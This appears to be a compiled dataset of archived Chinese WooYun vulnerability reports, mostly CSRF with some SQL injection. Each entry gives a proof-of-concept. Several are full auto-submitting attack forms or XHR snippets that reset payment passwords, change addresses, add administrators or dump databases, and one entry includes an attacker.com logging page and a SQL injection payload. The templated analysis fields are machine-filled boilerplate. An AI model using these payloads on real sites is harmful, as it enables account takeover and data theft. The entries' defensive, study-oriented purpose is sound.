**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="content" value="XXXXXXXXXXXXX" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></form><script

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2014-050389] ThinkSNS多处GET型CSRF（打包）
**厂商**: ThinkSNS | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 就拿你们的演示站点做了测试（是T3的最新版本）https://example.com/[已脱敏]

**POC**: 1）更改个人设置中的隐私设置（通过GET请求实现）https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 其实还有很多，我就不全部发上来了。所以重要的操作一定要区分POST和GET。
---

---
### [wooyun-2013-027684] 某社交平台博客csrf漏洞--自动退出
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 废话篇：本来不想提交的，但是我自己也登不上去了（也不知道怎么办了），为了我的博客（虽然是用来实验的）能继续登陆，不得不提交正文篇：某社交平台博客，插入图片直接输入https://example.com/[已脱敏]

**POC**: 看看这个地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-0117289] UI中国某功能设计缺陷导致跨站请求伪造(CSRF)#3
**厂商**: ui.cn | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: UI中国关注功能设计缺陷导致跨站请求伪造(CSRF)#3

**POC**: poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="act" value="follow"/><input type="hidden" name="ct" value="add"/><input type="hidden" name="followid"

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-0160261] 某社交平台某社交平台CSRF之点我链接就会关注
**厂商**: 某社交平台某社交平台 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题页面：https://example.com/[已脱敏]

**POC**: 这里我们以昨日@gainover在某社交平台上曝光的@呆子不开口的年轻时候的恋人 @我是王学翠进行证明。我的马甲号：可以看到目前关注数是37个人。访问测试页面：https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="post"><input type="text" name="uid" value="5787593657" />

**绕过**: 过滤绕过

**修复**: 修复referrer验证
---

---
### [wooyun-2015-093157] CSRF窃取账号影响账户安全
**厂商**: 100bt.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百田网邮箱绑定和密保问题设定都只是验证了用户的多多号码，而多多号码是公开的，如下图所以，我的粉丝解析来看下绑定邮箱和设定密保问题的请求具体数据

**POC**: 我在本地写一个 csrf页面，对一个账号进行测试首先这里显示没有密保问题然后如下代码，本地apache环境运行显示成功看到可以使用密码问题了

**绕过**: 直接利用

**修复**: 需要加入一个hash值，不能是固定的值，对于提交数据方进行验证，判断数据是否是从原始页面请求提交。
---

---
### [wooyun-2015-0130716] 某快递公司旗下某站存在csrf他人收货地址可修改
**厂商**: 某快递公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某快递公司旗下某电商网站修改收货地址处存在csrfhttps://example.com/[已脱敏]"POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("receiverAdd.receiverName=woo126某IM软件&receiverAdd.mobile=13611111111&receiverAdd.detailAddress=fwagrfagrasgre&recei

**POC**: 以证明

**绕过**: 直接利用

**修复**: 加token验证referer
---

---
### [wooyun-2016-0170272] 点我的链接我就可能会进入你的某音乐APP
**厂商**: 某互联网公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某音乐APP的接口都用了Token来防止CSRF，然后百密一疏，在正常的某社交平台的绑定接口中，分以下几个步骤走1. 用户点击绑定按钮，向后台发起绑定的请求，GET /api/sns/authorize2. 302到某社交平台的授权页面：https://example.com/[已脱敏] 用户授权完成，回调到https://example.com/[已脱敏] Token问题就出在最后一步中，虽然第二步的参数中带上了state的参数，但是经过验证这个参数好像没有好好用上，而且这个参数对于某社交平台某社交平台的API来说不是必须的，引用一下某社交平台的文档：用于保持请求和回调的状态，在回调时，会在Query Parameter中回传该参数。开发者可以用这个参数验证请求有效性，也可以记录用户请求授权页前的位置。这个参数可用于防止跨站请求伪造（CSRF）攻

**POC**: 测试代码，pip安装一下requests, BeautifuSoup, Flask，改一下下面的某社交平台账号和密码（记得需要先授权），然后访问一下即可：# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_form = u'''<form action="https://example.com/[已脱敏]" method="post"><input type="te

**绕过**: 直接利用

**修复**: 你们应该比我专业
---

---
### [wooyun-2015-0131903] 晋江文学某站任意收货地址重置漏洞(CSRF)
**厂商**: 晋江文学 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 没有验证好我们构造poc我们登录帐号2 进行访问我们访问csrf那个文件看已经成功了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加token验证
---

---
### [wooyun-2015-0155773] 绿麻雀最新P2P系统大量CSRF+无视验证码撞裤攻击（Demo演示）
**厂商**: lvmaque.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 第①个：撞裤攻击漏洞：从内到外再到后台的漏洞，先从前台的撞裤攻击来讲！经过测试，登陆密码错误以后验证码是没有改变的，页面也没有被刷新。现在我拿BURP截断来爆破一下密码，这里为了演示我就小小爆破一下就行了，证明验证码输入一次以后是一直可以爆破的，因为后台账号和密码是官方有提供的，以免人家说的撞裤出来的都是从后台修改他们的密码来的！这是一个登陆的请求包，现在我就先爆破密码的，这里是账号和密码是可以一起爆破的，完全是没有什么限制的！返回1：true那就是说明密码就是正确的（里面爆破的密码是我随便输入的，为了演示一下）看，其他包显示的都是0：false.现在我们把包发送回去，然后刷新一下页面可以看到

**绕过**: 直接利用

**修复**: 加上token之类的验证，撞裤攻击的话可以限制一下登陆错误的次数或者登陆错误后自动更新验证码。
---

---
### [wooyun-2014-081739] 昵图网某处CSRF可设置用户支付密码
**厂商**: 某图片网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昵图网账户信息->密码修改处，对未设置过支付密码的用户，存在CSRF，可被恶意设置支付密码https://example.com/[已脱敏]

**POC**: POC：<form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name="sellPwd" value="abcdef1!"></input><input type=text name="sellPwdConfirm" value="abcdef1!"></input><input type="submit" value="submit" /></form><script>document.csrf.submit();</script>

**绕过**: 直接利用

**修复**: token，验证码
---

---
### [wooyun-2012-08529] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="content" value="XX" /><input type="submit" value="submit" /></form><script>document.imlongha

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2015-0110465] 同程旅游旗下多平台共享用户信息，设计缺陷可导致撞库
**厂商**: 某旅游公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 从主站上可以看到同程旗下重点推三个网站在主站ly.com下面似乎不存在这个问题，但17u.net却可以发挥fuzzing首先在ly.com下面注册用户，在17u.net下面登录或者在17u.net下面注册，在ly.com下面登录我就不截图了。这个是100%可以的。因为两边我都试过了。包括在17u.com下面也是可以登录的。那么fuzzing发生在哪里呢？就是在17u.net下面首先fuzzing用户名在17u.net下面注册的时候如果手机号码已经存在，会有这样的提示如果不存在，会有这样的提示抓包可以看到，存在时返回status:200不存在时返回status:100那通过这个status，我们

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-059117] 某电商平台客户端扫描二维码登陆缺陷可进行账号劫持
**厂商**: 某电商平台 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 技术细节：某电商平台二维码页面：https://example.com/[已脱敏])securityId主要是来给前端轮询二维码扫描状态的；而barcode是二维码中的字符串，给手机客户端扫描用的。轮询接口：https://example.com/[已脱敏]

**POC**: 情景模拟：当你浏览器登录某电商平台的情况下，如下：你看到了一个第三方站点的二维码如下：如果网站上有一些欺骗性的语言，如某电商平台客户端扫描得红包，抑或你刚用某电商平台买完东西，提示你扫码可以返现之类的社会工程学来诱使你用某电商平台客户端扫描二维码。其实，攻击者那边可能有一个页面一直在等待着你上钩：一旦你扫描了，然后攻击者的浏览器里就登录了你的某电商平台，如下：小缺陷：1.受害者扫描之后会发现手机上的确认登录页面，但是此时攻击者已经达到了想要的目的；2.受害者浏览器某电商平台的登录用户和手机上的必须一致，一般人都只有一个某电商平台账号。

**绕过**: 直接利用

**修复**: 确认登录接口做下csrf防范吧。
---

---
### [wooyun-2014-078286] UCenter存在多处CSRF（可备份数据、删除应用、删除管理员等）
**厂商**: Discuz! | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: UCenter有很多处没有判断formhash啊……都可以CSRF……

**POC**: #1 删除应用formhash为空，成功提交#2 删除管理员formhash为空，成功删除#3 备份数据无formhash，目录名可控如果是windows用户，基本上就能拖下来了……

**绕过**: 直接利用

**修复**: 首先判断formhashwindows短文件名解决策略：1.首先要想的是改变存储文件名的策略（而不是把所有责任都推给用win主机的用户），毕竟用windows服务器的用户还不占少数。windows文件名大于8个字符就可以用过短文件名访问到。因为短文件名取前6个字符加上"~数字"，那么为什么不让文件名
---

---
### [wooyun-2014-054888] 天涯--某社交平台OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 天涯社区 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 详细说明：天涯-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个天涯-某社交平台OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏] 天涯网会自动将用户的帐号

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-011556] 果壳网架构设置缺陷导致CSRF泛滥
**厂商**: 果壳传媒 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 到处是CSRF啊。https://example.com/[已脱敏] 加关注+留言。。。。

**POC**: var request = false;if(window.XMLHttpRequest) {request = new XMLHttpRequest();if(request.overrideMimeType) {request.overrideMimeType('text/xml');}} else if(window.ActiveXObject) {var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP','Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxm

**绕过**: 直接利用

**修复**: formkey 和Referer验证 可以和同行(zhihu.com)讨论下技术,他们防范不错~ 或者联系菜鸟我。
---

---
### [wooyun-2015-0109337] 某生鲜电商可修改他人基本资料(csrf一)
**厂商**: fruitday.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可静心构造表单 <img src=>等等 发给别人就触发

**POC**: 如上图

**绕过**: 直接利用

**修复**: 加token 验证来源头
---

---
### [wooyun-2012-05038] 开心集品中收集的漏洞可导致用户自动收集我的信息
**厂商**: kaixin001.com | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一步 将post转成 GET请求第二步 利用日记等具备贴图功能将GET请求植入到文章中

**POC**: 第一步 将post转成 GET请求https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强制POST判断
---

---
### [wooyun-2015-0130911] 某生鲜电商某后台登陆页面存在CSRF导致可以重置管理员密码
**厂商**: fruitday.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: POST /model/edituser.php?id=3 HTTP/1.1Content-Length: 37Pragma: no-cacheCache-Control: no-cacheReferer: https://example.com/[已脱敏] enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsCookie: PHPSESSID=vuem5apdi7g7g

**绕过**: 直接利用

**修复**: 相关接口进行csrf验证
---

---
### [wooyun-2014-068440] FengCMS的CSRF漏洞可导致数据库被dump
**厂商**: fengcms.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台管理中的数据备份功能未进行csrf token验证。攻击者制作内容如下的csrf.php并放到attacker.com下面：<?phpfile_put_contents("test.txt",  " IP:".$_SERVER["REMOTE_ADDR"], FILE_APPEND);file_put_contents("test.txt",  " Time:".date("Y.m.d H:i:s"),FILE_APPEND);?><img src="https://example.com/[已脱敏]">随后将https://example.com/[已脱敏]

**POC**: 攻击者成功得到备份数据库路径，并进行下载：

**绕过**: 直接利用

**修复**: 1。备份文件名可预测性过高。建议使用随机性更强的文件名
---

---
### [wooyun-2014-075925] ecshop最新版csrf 下载数据库
**厂商**: ShopEx | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本，最新的2.7.4 beta1 目测2.7.3所有版本也都没有token没有新鲜事。翻了好几遍厂商漏洞列表，确实没看到有人提过。备份数据库的功能。请求如下：有一个token的字段，但是默认为空，服务端也没有检查该字段，直接为空就可以请求成功。同样，厂商采用了使用referer的方式来防御csrf，只要为空就可以绕过。可以说是这种防御是没有效果的。构造好exp，管理员点击之后，在web目录下生成用户可控文件名的sql文件。可以直接下载。

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 感觉应该提一个csrf防御绕过的漏洞，不然每个功能点都可以提一个了。。。
---

---
### [wooyun-2013-022998] 某论坛系统 刷关注,粉丝
**厂商**: 某论坛系统 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某论坛系统 9.0加关注 刷粉..直接修改uid 后面参数即可..http://[IP已脱敏]

**POC**: 某论坛系统 9.0加关注 刷粉..直接修改uid 后面参数即可..http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0125679] 天天团购安卓客户端 随意删除他人收货地址
**厂商**: 天天团购 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 删除收货地址，并抓包虽然有token值，但经测试，发现他是固定值，实为摆设。构造csrf链接（改变id即可）xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("appcode=android&id=943&r=%2Faddress%2Fdelete&token=45ea04c221bceff4190afe03d5cd5103");访问链接删除地址成功，刷新收货地址，验证。

**POC**: 同上

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2015-0162481] 点我的链接我就可能会进入你的果壳账号
**厂商**: 果壳传媒 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 果壳社区的绑定某社交平台登陆的请求为https://example.com/[已脱敏]

**POC**: 已录视频https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
---

---
### [wooyun-2013-027425] 麦单网某处GET型csrf可引发大规模蠕虫
**厂商**: imaidan.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 麦单网发表分享处无token虽然请求为POST，但GET也可，危害瞬间提高了一个等级啊。POC:https://example.com/[已脱敏]"testcsrf"的分享，如果在这条分享中，又包含以上POC，将会引发大规模蠕虫。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关键操作一定要用POST关键操作一定要加token关键操作最好要加Referer限制
---

---
### [wooyun-2013-035940] 某社交平台另类CSRF蠕虫放大危害
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一个<from>标签引发的血案。

**POC**: 我们知道某社交平台博客有一个转载功能：我们来试试其中一个，轻博客。构造如下HTML发布到博客首页的自定义组件里。<form name="IjaxForm" action="https://example.com/[已脱敏]" method="post" target="loadingIframe_thread3561"><input type="hidden" name="version" value="7"><input type="hidden" name="blogId" value=

**绕过**: 直接利用

**修复**: 阿木哥，礼物你懂的...
---

---
### [wooyun-2015-098776] 禅道项目系统csrf添加管理员
**厂商**: 禅道 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以通过这个csrf到管理员权限

**POC**: POST /dao/www/index.php?m=user&f=create&dept=0 HTTP/1.1Host: [IP已脱敏]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2013-026269] 某社交平台csrf可构造蠕虫
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 依然是t.hk.某域名.com1.直接发布一条某社交平台并抓包得到如下数据；POST /index.php/index/t/add HTTP/1.1Host: t.hk.某域名.comProxy-Connection: keep-aliveContent-Length: 776Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: https://example.com/[已脱敏] multipart/form-data; boundary=----WebKitFormBoundarydAxCJafTU9L2NcZDReferer: https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2013-041221] 起点个人中心关注csrf漏洞
**厂商**: 盛大网络 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关注就一个addfollow函数，简单的用户id和用户名post的数据非常简单

**POC**: <html><body><form name="addfollow" action="https://example.com/[已脱敏]" method="post"><input name="ajaxMethod" value="addfollow" /><input name="followingId" value="2263635" /></form><script>document.addfollow.submit();</script></body></html>我关注的：打开poc页面：利用成功：

**绕过**: 直接利用

**修复**: token，referer等等等等
---

---
### [wooyun-2015-0162515] 点我的链接我就可能会进入你的某视频网站账号
**厂商**: 某视频网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站的绑定某社交平台登陆的请求为https://example.com/[已脱敏]

**POC**: 已录视频https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
---

---
### [wooyun-2015-093070] FineCMS轻量版csrf漏洞后台添加管理+任意挂黑页
**厂商**: dayrui.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 又一个cms的csrf漏洞，没有任何token验证

**POC**: 1、后台，管理员，添加2、抓包截断没有验证3、构造表单4、挂黑页，他有一个模版，里面可以添加修改html文件截断一下，看也是可以csrf的演示完毕！感谢观赏

**绕过**: 直接利用

**修复**: 加验证
---

---
### [wooyun-2013-021181] 某公众平台api的几个设计问题
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如图，给用户单发信息处，没用token，导致csrf。https://example.com/[已脱敏]

**POC**: 发给一朋友时的测试截图：

**绕过**: 直接利用

**修复**: 1、token2、请求频率限制
---

---
### [wooyun-2014-077655] DouPHP可CSRF脱裤
**厂商**: douco.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在www\admin\backup.php：if ($rec == 'backup') {$fileid = isset($_REQUEST['fileid']) ? $_REQUEST['fileid'] : 1;$tables = $_REQUEST['tables'];$vol_size = $_REQUEST['vol_size'];$totalsize = $_REQUEST['totalsize'];$file_name = $_REQUEST['file_name'];  //1、用户输入的文件作为备份文件名// 判断备份文件名是否规范if (!$check->is_backup_file($file_name . '.sql'))  //2、is_backup_file 仅检查是否是字母数字开头、.sql结尾$dou->dou_msg($_LANG['backup_file

**POC**: <html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><body><form name="csrf" action="http://[IP已脱敏] method="post"><input type="hidden" name="chkall" value="check"><input type="hidden" name="tables[]" value="dou_admin"><input type="hidden" name="tabl

**绕过**: 直接利用

**修复**: csrf漏洞利用
---

---
### [wooyun-2015-0111863] 某搜索引擎贴吧CSRF一枚（专门针对吧主权限的账户）
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先打开一个我有吧主权限的贴吧，抓包查看修改会员名称的数据包如图然后发现是这样向https://example.com/[已脱敏] id="form1" name="form1" method="post" action="https://example.com/[已脱敏]"><p>贴吧名称kw：<input type="text" name="kw" id="kw" /></p><p>会员名称mbr_alias：<input type="text" name="mbr_alias" i

**POC**: 我在backtrack这个吧测试了一下。发现可以成功在外域通过表单提交修改。如图之前贴吧会员名称是BT现在填好表单然后提交，返回json数据，错误码为0，根据某搜索引擎惯例，0都是成功。然后再来backtrack吧看一下果然被修改了

**绕过**: 直接利用

**修复**: 加入tbs，或者验证来源也可以。
---

---
### [wooyun-2015-0120762] 发现csrf一枚可以使房网注册用户强制捆绑他人邮箱
**厂商**: 搜房网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在房网注册一个测试用的账号soufunpa6164既然是找csrf   就上信息修改去试试-----------------最后盯上了邮箱绑定那个某邮箱服务试试--------------------然后上代理抓包咦  发现没啥token-------------------------那莫就构建一个网页试试吧既然是自己测试就不那莫麻烦构建了 简便一点就ok了-----------------------------------构建好了  那莫就该测试了我就换个浏览器新建个账号好了然后擦如我刚才构建的网页  结果有门  点击试试咦   一枚csrf到手

**POC**: 同上

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2012-05028] 某社交平台某社交平台自动加关注
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 将自己的网站发表到某社交平台 用户点击后可以自动关注某用户

**POC**: <form action="https://example.com/[已脱敏]" method="post" id="f"><input name="uids" value="1237949364,2143550005"></form><script>document.getElementById('f').submit();</script>

**绕过**: 直接利用

**修复**: 1.加来源限制2.判断是不是ajax请求
---

---
### [wooyun-2015-0158328] 某搜索引擎某站存在SQL注射漏洞ROOT权限
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] (POST)except_label_ids=&YII_CSRF_TOKEN=

**POC**: ---Parameter: except_label_ids (POST)Type: boolean-based blindTitle: OR boolean-based blind - WHERE or HAVING clausePayload: except_label_ids=-1823) OR 9214=9214 AND (7202=7202&YII_CSRF_TOKEN=b2a372d95b23a82c96b413253c9597a172f31e4c---web application technology: Apacheback-end DBMS: MySQL 5current u

**绕过**: 直接利用

**修复**: ~~~~
---

---
### [wooyun-2015-0105968] 花瓣网某处功能设计缺陷导致跨站请求伪造(CSRF)#3
**厂商**: huaban.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 花瓣网某处功能设计缺陷导致跨站请求伪造(CSRF)#3

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2014-075538] 擎天科技SKYWCM全版本CSRF漏洞，可执行任意SQL
